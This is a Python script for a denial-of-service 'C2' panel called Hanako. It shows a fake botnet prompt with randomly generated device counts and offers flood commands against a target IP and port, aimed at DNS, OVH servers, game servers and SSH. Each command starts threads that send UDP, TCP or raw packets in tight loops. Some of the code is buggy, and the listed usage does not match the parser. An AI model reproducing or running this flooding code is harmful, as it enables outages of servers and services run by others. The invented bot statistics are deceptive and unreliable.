#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "HANAKO"

methods = """
               \033[37m           ,MMM\033[35m8&&&.
               \033[37m      _...MMMMM\033[35m88&&&&..._
               \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.
               \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::
               \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
               \033[37m     `''''MMMMM\033[35m88&&&&''''`
               \033[37m           'MMM\033[35m8&&&'


[ LAYER - 4 ] 

– .DNS : Multiple Amplification Methods
– .TCP-XV : TCP OVH Interno Bypass
– .OVHUDP : UDP OVH Game Bypass
– .FIVEM : Game Flood Optimized For FM
– .TCP : TCP Socket Flood and SYN-ACK
– .NFO : SYN Flood + Raw UDP + Handshake
– .R6DROP : Game Flood Optimized For R6
– .RNDROP : Game Flood Optimized For FN
– .SSH-DOWN : SSH V1/1.1/2 Flood

[ EXAMPLE ATTACK ]

– .DNS:  [ IP ] [ PORT ] [ TIME ]
– .OVHTCP: [ IP ] [ PORT ] [ TIME ]
– .OVHUDP: [ IP ] [ PORT ] [ TIME ]
– .FIVEM [ IP ] [ PORT ] [ TIME ]
– .TCP [ IP ] [ PORT ] [ TIME ]
– .NFO: [ IP ] [ PORT ] [ TIME ]
– .R6DROP: [ IP ] [ PORT ] [ TIME ]
– .RNDROP: [ IP ] [ PORT ] [ TIME ]
– .SSHDOWN: [ IP ] [ PORT ] [ TIME ]
 """



banner =  """
Welcome - Hanako [ C2 ].
Founded By Hanako123
Version, 1.1
2022 - 2023
\x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " 𝓶𝓮𝓽𝓱𝓸𝓭𝓼 " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
"""
cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def stdtcp(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(32500,41500))
		sys.stdout.write("\x1b]2; FAKEBOTNETCEOW. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[0;30;45mFAKE @ BOTNET\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "methods":
			os.system ("")
			print (methods)
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == ".tcp-xv":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b'\xf5\xd3?\xbe\xaduUf\x03\xdf\xae\x00r\x83\n\xf8\x937\xcc\x84\xd9LQa\xc0R(\xcc\xf6"\x19f\xf9\xd0\xbdS\x90A\x8c\xa7\xa0\x8ek\xfe~"i\xe4k\xd4\xcf\xc9\xd6\x7f\x07p\xf7G]\xca\xc0F\xc4\xd9\x8d\xd2\x04*\xfd\xcd\x1a\xe4\xd0W\xb2+\xf1fJ\xee\xb3\xcf\xb4>z\xb1\xb6~\x05\xfdw\xba\xb1\x1b\xa2\x89\xf1A\xec\xd3\xd2\x82\x08\xec\xb4n\xca|\xe0A\xdf\x9f\xd65\x1d\x9b\xablL\x02\x7f\x17X\xf2\xdd\x14>V\x02-\xe0\x90{\x06C2G\xe0\xc5\xfe\xb8\xcb\x0f\xc11kp2\xae?\x96\xdb\xb4\xaa\x8dU\xec\x8eT:\naG\xdfRj\x99\xcd\xef\n\xf6\xe3\xdb\xf6\xd1+k^\xa7r\xbc\xaf\xec\xb6\x8fZ\xa9z\xf6\xa7_{Uc\xb6\xdagI\xdb\x98\xfd\xac\xd0)qi\xb2l\x05\xac\xa3\x0c\x16\x1d\xd2\x15\xe0\xbat\xb0\xae\xe5*\n\xaa\x82z\xe4\xe1\x94\x1f\xf3"\x1clf8K3\xcdn\xd2a\xf1v\x89\xebL\x16\xd6]\x7fZ\xd1\x90A\xf8o \x13\x83\x01\xe8v\xdf~\x0e}<t5$\xbb\xb9\xbb\x052\xda\xaacZ\x04\xf3B2pS\xe2Y\xee]8\x7f)\xfad\x8c\xdc\xa1\xa9\xeaI1\xec\x83\xfd\x88\xe3\xb1X\x00\xd2\xf3\x97\xf9\x0b\x19:\x83.x\x8aP\xc5=\xed%|?(X\xcf\xc3\x99\x14Q\x80\xd3g/\xbd\xe2\x89J\xd2\x80\'\x16\x96\xa8\xf7\x86\xa7\xde{\xe5\x05\x1dgqw\xb8\xe5\x9d\xca\xe3b//\xd0z&\xc0u\xd4#p\x12\xd8Jh\xa5\xb6\xc3\x9d\xc7\xe5b6\xcd"\xc4\xe1\x1b\xda\x94Dc\xb5\x84\xa3\n\x97\x87i\xe9\xbeefu\x18\xc7\xf1\x93G\x95\xf9Pz\x9c"rzM\x0cm\xa8\xc6*d\xf8|L\xf8M\xdc@X/\xe2\x17\xe3\xbf\x9e-\xf7\xa6\x95\x92DqZD\xce\xf1\xef\xeb\xfc\xd5\xa8\x7f\x15\x1cM\xde\xad\xb2\xf1\xec\xb1F\xf5\xce\xf5[\x90\xd7\xfc\xe8a\xdb\x14\x9f+\x8c\xc1F\xb7\x1b_\xdc\xce\xbe\'\xd4\x1aN\x07\xbbc\xfc\xec\xf0\xfe\xcd\xd8\xf9\xee\x1b@G\x10\x0f \xd2\xffRF\xdb\x01\xfe\xfa\x92\xf3\x86\xe0\x93\x86z\xb0"\xe4\x85\xcd\x10\x9e\xbb7\x81e\nV6\xd4\xd8\xb7\x85\xfe\x96?\x8b\xdf%\x1c\x87\xfb=\x00\xcb\x11\xea\xd2y\xefH\x13\xac)u}\xd1\x0b\xb5k\xf9\x0e\xf0Z?\xac8\xd4\x0e\xec\xa2 \xe6\xe4\xc3\xb3!x\x00\xef\x88\n\x04Z\xa1\xab\xec\xde\xe2l\x9b\xf5\x89\xaf\x86\x16\xbcCM\x15\x9f\xa9\x0f\xb5\x7f\x84\x11\xdc\x15q\xae\xe0\xbap\xac+\xe4\xd6>z\xc5\xfb\x9a\xf2Q\xad]\xed\xd8\xe4\xa2\xe1x\xc5\x88\xb3\x1aM+3\x13\xbf68y\xf5x\xb1\x88\x84\x84!'
					threading.Thread(target=stdtcp, args=(host, port, timer, payload)).start()
					print("\033[1;37;40mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".dns":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovhudp":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mServer...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".sshdown":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".fivem":
			try:
				if running >= 991:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == ".nfo":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".tcp":
			try:
				if running >= 991:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully sent attack to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".rndrop":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 50000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".r6drop":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

